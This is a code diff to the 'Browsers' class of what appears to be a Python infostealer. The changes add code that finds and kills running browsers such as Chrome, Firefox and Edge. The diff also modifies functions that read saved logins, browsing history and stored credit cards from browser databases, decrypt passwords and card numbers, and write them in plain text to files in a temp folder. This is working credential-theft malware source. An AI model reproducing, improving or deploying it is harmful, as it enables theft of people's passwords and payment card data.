@@ -551,9 +551,10 @@ class Browsers:
     def __init__(self):
         self.appdata = os.getenv('LOCALAPPDATA')
         self.roaming = os.getenv('APPDATA')
+        self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
+                            "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
+        self.browsers_found = []
         self.browsers = {
-            'amigo': self.appdata + '\\Amigo\\User Data',
-            'torch': self.appdata + '\\Torch\\User Data',
             'kometa': self.appdata + '\\Kometa\\User Data',
             'orbitum': self.appdata + '\\Orbitum\\User Data',
             'cent-browser': self.appdata + '\\CentBrowser\\User Data',
@@ -580,6 +581,14 @@ class Browsers:
             'Profile 4',
             'Profile 5',
         ]
+
+        for proc in psutil.process_iter(['name']):
+            process_name = proc.info['name'].lower()
+            if process_name in self.browser_exe:
+                self.browsers_found.append(proc)
+
+        for proc in self.browsers_found:
+            proc.kill()
 
         os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)
 
@@ -641,20 +650,21 @@ class Browsers:
         if not os.path.isfile(path):
             return
         conn = sqlite3.connect(path)
-        with conn:
-            cursor = conn.cursor()
-            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-            for results in cursor.fetchall():
-                if not results[0] or not results[1] or not results[2]:
-                    continue
-                url = results[0]
-                login = results[1]
-                password = self.decrypt_password(results[2], self.masterkey)
-                with open(os.path.join(temp_path, "Browser", "passwords.txt"), "a", encoding="utf-8") as f:
-                    f.write(f"{url}  |  {login}  |  {password}\n")
+        cursor = conn.cursor()
+        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+        password_file_path = os.path.join(temp_path, "Browser", "passwords.txt")
+        for results in cursor.fetchall():
+            if not results[0] or not results[1] or not results[2]:
+                continue
+            url = results[0]
+            login = results[1]
+            password = self.decrypt_password(results[2], self.masterkey)
+            with open(password_file_path, "a", encoding="utf-8") as f:
+                if os.path.getsize(password_file_path) == 0:
+                    f.write("Website  |  Username  |  Password\n\n")
+                f.write(f"{url}  |  {login}  |  {password}\n")
         cursor.close()
         conn.close()
-
 
     def cookies(self, name: str, path: str, profile: str):
         if name == 'opera' or name == 'opera-gx':
@@ -687,10 +697,13 @@ class Browsers:
             return
         conn = sqlite3.connect(path)
         cursor = conn.cursor()
-        with open(os.path.join(temp_path, "Browser", "history.txt"), 'a', encoding="utf-8") as f:
-            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
-                url, title, visit_count, last_visit_time = res
-                f.write(f"{url}\t{title}\t{visit_count}\t{last_visit_time}\n")
+        history_file_path = os.path.join(temp_path, "Browser", "history.txt")
+        with open(history_file_path, 'a', encoding="utf-8") as f:
+            if os.path.getsize(history_file_path) == 0:
+                f.write("Url  |  Visit Count\n\n")
+            for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
+                url, visit_count = res
+                f.write(f"{url}  |  {visit_count}\n")
         cursor.close()
         conn.close()
 
@@ -703,11 +716,14 @@ class Browsers:
             return
         conn = sqlite3.connect(path)
         cursor = conn.cursor()
-        with open(os.path.join(temp_path, "Browser", "cc's.txt"), 'a', encoding="utf-8") as f:
-            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards").fetchall():
-                name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified = res
+        cc_file_path = os.path.join(temp_path, "Browser", "cc's.txt")
+        with open(cc_file_path, 'a', encoding="utf-8") as f:
+            if os.path.getsize(cc_file_path) == 0:
+                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
+            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
+                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                 card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
-                f.write(f"{name_on_card}\t{expiration_month}\t{expiration_year}\t{card_number}\t{date_modified}\n")
+                f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
         cursor.close()
         conn.close()
 
